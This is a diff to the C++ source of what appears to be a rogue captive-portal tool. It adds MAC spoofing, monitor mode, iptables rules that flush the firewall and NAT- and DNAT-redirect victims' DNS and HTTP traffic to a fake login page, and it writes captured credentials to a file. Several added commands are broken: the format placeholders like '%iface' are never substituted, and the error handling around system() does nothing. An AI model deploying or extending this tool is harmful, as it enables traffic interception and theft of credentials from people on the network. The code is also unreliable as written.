@@ -5,6 +5,7 @@
 #include <iostream>
 #include <fstream>
 #include <iterator>
+#include <stdio.h>
 #include <boost/algorithm/string.hpp>
 #include <boost/filesystem.hpp>
 //#include "include/boost/process.hpp"
@@ -15,6 +16,7 @@
 #include <boost/network/uri.hpp>
 //libhttpserver for debian
 #include <httpserver.hpp>
+#include "termcolor.hpp"
 //g++ -L/usr/include/boost/program_options.hpp ./main.cpp -o ./main.o -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lboost_process -lboost_network
 //namespace process = boost::process;
 using namespace std;
@@ -23,7 +25,6 @@ using namespace httpserver;
 namespace filesystem = boost::filesystem;
 namespace options    = boost::program_options;
 namespace url_parse  = boost::network::uri;
-
 
 bool hook;
 int PORT;
@@ -39,6 +40,31 @@ std::string hook_location;
 std::string redirect_ip;
 std::string beef_hook;
 std::string addr;
+std::string iface;
+
+void colorprint(std::string color, std::string text) {
+    if (color == "red"){
+        std::cout << termcolor::red << text << termcolor::reset << std::endl;
+    } else if (color == "green") {
+        std::cout << termcolor::green << text << termcolor::reset << std::endl;
+    } else if (color == "magenta") {
+        std::cout << termcolor::magenta << text << termcolor::reset << std::endl;
+    } else if (color == "blue") {
+        std::cout << termcolor::blue << text << termcolor::reset << std::endl;
+    } else if (color == "grey") {
+        std::cout << termcolor::grey << text << termcolor::reset << std::endl;
+    } else if (color == "cyan") {
+        std::cout << termcolor::cyan << text << termcolor::reset << std::endl;
+    } else if (color == "white") {
+        std::cout << termcolor::white << text << termcolor::reset << std::endl;
+    } else if (color == "yellow") {
+        std::cout << termcolor::yellow << text << termcolor::reset << std::endl;
+    };
+};
+
+void errprint(auto err) {
+    colorprint("red" , err);
+};
 
 void make_html(std::string hook_loc, std::string formaction){
     std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
@@ -59,6 +85,25 @@ void make_html(std::string hook_loc, std::string formaction){
     html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
 };
 
+
+void  setMac(char * mac) {
+//i stole this
+	char cmd[64];
+	char nwkInf[5]="eth0";
+	memset(cmd,0X00,64);
+	sprintf((char *)cmd,(const char *)"ip link set %s down",nwkInf);
+	system((const char *)cmd);
+	usleep(500);
+	memset(cmd,0X00,64);
+	sprintf((char *)cmd,(const char *)"ifconfig %s hw ether %s",nwkInf,mac);
+	system((const char *)cmd);
+	usleep(500);
+	memset(cmd,0X00,64);
+	sprintf((char *)cmd,(const char *)"ip link set %s up",nwkInf);
+	system((const char *)cmd);
+	usleep(500);
+};
+
 int parse_commandline(int argc, char* argv[]){
     options::options_description desc("Captive portal server, very insecure and not for beginners, if you have a problem, solve it. If you get hacked while using this, too bad");
     desc.add_options()
@@ -77,7 +122,8 @@ int parse_commandline(int argc, char* argv[]){
     try {
         options::notify(arguments);
     } catch (std::exception& e) {
-        std::cerr << "ERROR: " << e.what() << "\n";
+        auto errortext = e.what();
+        errprint(errortext);
         return 1;
     };
     if (arguments.count("help")) {
@@ -131,7 +177,8 @@ public:
             credentials << data;
             return 0;
         } catch (std::exception& e) {
-            std::cerr << "ERROR: " << e.what() << "\n";
+            auto errortext = e.what();
+            errprint(errortext);
             return 1;
         };
     };
@@ -146,6 +193,8 @@ public:
 
     };
 };
+
+
 void start_server(){
     webserver server = create_webserver(PORT);
     CaptivePortal captiveportal;
@@ -154,11 +203,83 @@ void start_server(){
     server.register_resource("/login", &login);
     server.start(true);
 };
+
+int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
+
+    system(("ip link set %iface down", netiface).c_str());
+    system(("ip addr add %ip dev %iface", ip_addr, netiface).c_str());
+    try {
+        system(("iwconfig %s mode monitor", netiface).c_str());
+        colorprint("green" , "[+] Monitor Mode Enabled");
+        } catch (std::exception& e) {
+            auto errortext = e.what();
+            errprint(errortext);
+            colorprint("yellow" , "[-] Failed to set monitor mode");
+            return 1;
+        };
+    system(("ip link set %iface up", netiface).c_str());
+
+    colorprint("green" ,"[+]Clearing IP Tables Rulesets");
+    system("iptables -w 3 --flush");
+    system("iptables -w 3 --table nat --flush");
+    system("iptables -w 3 --delete-chain");
+    system("iptables -w 3 --table nat --delete-chain");
+
+    colorprint("green" ,"[+]enable ip Forwarding");
+    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+
+    colorprint("green" ,"[+]Setup a NAT environment");
+    system(("iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE", netiface).c_str());
+
+    colorprint("yellow" , ".. Block all traffic in");
+    system(("iptables -w 3 -A FORWARD -i %iface -j DROP", netiface).c_str());
+
+    colorprint("green" ,"[+]allow incomming from the outside on the monitor iface");
+    system(("iptables -w 3 --append FORWARD --in-interface %iface -j ACCEPT", netiface).c_str());
+
+    colorprint("green" ,"[+]allow UDP DNS resolution inside the NAT  via prerouting");
+    system(("iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ", ip_addr).c_str());
+
+    colorprint("green" ,"[+]Allow Loopback Connections");
+    system("iptables -w 3 -A INPUT -i lo -j ACCEPT");
+    system("iptables -w 3 -A OUTPUT -o lo -j ACCEPT");
+
+    colorprint("green" ,"[+]Allow Established and Related Incoming Connections");
+    system("iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT");
+
+    colorprint("green" ,"[+]Allow Established Outgoing Connections");
+    system("iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT");
+
+    //#colorprint("green" ,("[+]Internal to External")
+    //system("iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface))
+
+    colorprint("green" ,"[+]Drop Invalid Packets");
+    system("iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP");
+    system("iptables -w 3 -A FORWARD -i %iface -p tcp --dport 53 -j ACCEPT");
+    system("iptables -w 3 -A FORWARD -i %iface -p udp --dport 53 -j ACCEPT");
+
+    colorprint("yellow" , ".. Allow traffic to captive portal");
+    system(("iptables -w 3 -A FORWARD -i %iface -p tcp --dport %port -d %ip_addr -j ACCEPT", netiface, port, ip_addr).c_str());
+/*   ###################################################
+    #
+    #       HERE IS WHERE THE WERVER IS STARTED
+    #
+    #
+    ###################################################*/
+    colorprint("green" ,"Starting web server");
+    start_server();
+    colorprint("green" ,"Redirecting HTTP traffic to captive portal");
+    system(("iptables -t nat -A PREROUTING -i %iface -p tcp --dport 80 -j DNAT --to-destination %dest", netiface, ip_addr).c_str());
+
+};
+
 int main(int argc, char* argv[]) {
     auto pwd = filesystem::current_path();
     parse_commandline(argc, argv);
 
 };
+
+
 
 
 
